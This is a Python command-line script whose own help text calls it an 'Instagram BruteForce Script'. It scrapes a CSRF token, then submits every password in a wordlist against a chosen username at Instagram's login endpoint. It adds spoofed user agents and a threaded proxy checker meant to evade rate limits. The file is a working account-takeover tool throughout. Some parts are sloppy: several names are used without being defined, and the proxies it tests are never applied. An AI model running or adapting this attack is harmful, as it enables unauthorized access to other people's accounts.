import urllib.request as rq
import random
import urllib.parse as http_parser
import argparse
import time
import socket
import threading

try:
    import Queue
except ImportError:
    import queue as Queue

THREAD = 4

class bcolors:
    HEADER = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def main(username, words):

  response = rq.urlopen('http://www.instagram.com')
  html = response.read()

  csrf_token = extract_csrf_token(html)

  for word in words:

    password = word.strip()

    craft_response(username, password, csrf_token)



def extract_csrf_token(text):

  page_text = str(text)

  result = page_text.find("csrf_token")
  after = page_text[result + len("csrf_token"):-1]


  csrf_token = after[:after.find(",")].replace(":", "").replace("\"", "")

  if len(csrf_token) == 0:
    print ("[-] Error extraction CSRF token, exiting...")
    exit()
  else:

    print ("CSRF token is: " + csrf_token)
    return csrf_token



def craft_response(username, password, csrf_token):

  user_agents = ["Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko)",
             "Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; HTC Vision Build/GRI40) AppleWebKit/533.1",
             "Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko)",
             "Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201",
             "Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0",
             "Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US))"]

  URL = "https://www.instagram.com/accounts/login/ajax/"


  values = {
    'username': username,
    'enc_password': encode_password(password),
    'Ps': '',
    'queryParams': '{}',
    'optIntoOneTap': 'false'
  }


  headers = {
    "Host": "www.instagram.com",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0",
    #"User-Agent": random.choice(user_agents),
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "X-CSRFToken": csrf_token,
    "X-Instagram-AJAX": "1",
    "X-IG-WWW-Claim": "0",
    "Content-Type": "application/x-www-form-urlencoded",
    "X-Requested-With": "XMLHttpRequest",
    "Origin": "https://www.instagram.com",
    "Referer": "https://www.instagram.com/",
    "Cookie": "csrf_token=" + csrf_token
  }

  """
  proxy_support = rq.ProxyHandler({'https': 'https://' + proxy})
  opener = rq.build_opener(proxy_support)
  rq.install_opener(opener)

  """

  data = http_parser.urlencode(values)
  data = data.encode('ascii')
  req = rq.Request(URL, data, headers)



  with rq.urlopen(req) as response:
    the_page = response.read()

    #print (the_page)

    try:

      if "\"authenticated\": false" in str(the_page):

        print ("Trying: " + "\"" + password + "\"" +"| FAILURE")

      else:
        print ("Success! Password is: " + password)
        exit()

    except Exception as err:
      print("Error: {0}".format(err))

def encode_password(password):

  formatted_time = str(int(time.time()))

  enc_password = '#PWD_INSTAGRAM_BROWSER:0:' + formatted_time + ':' + password

  return enc_password

def is_bad_proxy(pip):    
    try:
        proxy_handler = rq.ProxyHandler({'http': pip})
        opener = rq.build_opener(proxy_handler)
        opener.addheaders = [('User-agent', 'Mozilla/5.0')]
        rq.install_opener(opener)
        req=rq.Request('http://www.google.com')  # change the URL to test here
        sock=rq.urlopen(req)

    except Exception as detail:
        #print("ERROR:", detail)
        return True
    return False

def find_working_proxies(proxy_list):

  good_proxies = []

  for proxy in proxy_list:

    print (proxy)

    if not is_bad_proxy(proxy):
      good_proxies.append(proxy)

  return good_proxies

def check_avalaible_proxys(proxys):
    """
        check avalaible proxyies from proxy_list file
    """
    socket.setdefaulttimeout(30)

    global proxys_working_list
    print(bcolors.WARNING + "[-] Testing Proxy List...\n" + bcolors.ENDC)

    proxys_working_list = {}
    max_thread = THREAD

    queue = Queue.Queue()
    queuelock = threading.Lock()
    threads = []

    for proxy in proxys:
        queue.put(proxy)

    while not queue.empty():
        queuelock.acquire()
        for workers in range(max_thread):
            t = threading.Thread(target=check_proxy, args=(queue,))
            t.setDaemon(True)
            t.start()
            threads.append(t)
        for t in threads:
            t.join()
        queuelock.release()

    print(bcolors.OKGREEN + "[+] Online Proxy: " + bcolors.BOLD + str(len(proxys_working_list)) + bcolors.ENDC + "\n")

def check_proxy(q):
    """
    check proxy for and append to working proxies
    :param q:
    """
    if not q.empty():

        proxy = q.get(False)
        proxy = proxy.replace("\r", "").replace("\n", "")


        try:
        
            
            
            is_working = False

            if not is_bad_proxy(proxy):
                proxys_working_list.update({proxy: proxy})
                print(bcolors.OKGREEN + " --[+] ", proxy, " | PASS" + bcolors.ENDC)

            else:
                print(" --[!] ", proxy, " | FAILED")
            
            

        except Exception as err:
            if _verbose:
                print(" --[!] ", proxy, " | FAILED")
            if _debug:
                print(logger.error(err))
            pass  





if __name__ == "__main__":


  # Parse args
  parser = argparse.ArgumentParser(
        description="Instagram BruteForce Script",
        epilog="python angel_brute.py -u user_test -w words.txt"
    )

  # required argument
  parser.add_argument('-u', '--username', action="store", required=True,
                  help='Target Username')
  parser.add_argument('-w', '--word', action="store", required=True,
                  help='Words list path')
  parser.add_argument('-p', '--proxy', action="store", required=True,
                        help='Proxy list path')

  args = parser.parse_args()

  USER = args.username
  good_proxies = []

  try:
      words = open(args.word).readlines()
  except IOError:
      print("[-] Error: Check your word list file path\n")
      sys.exit(1)

  try:
    proxies = open(args.proxy).readlines()
  except IOError:
      print("[-] Error: Check your proxy list file path\n")
      sys.exit(1)


  check_avalaible_proxys(proxies)


  main(USER, words)




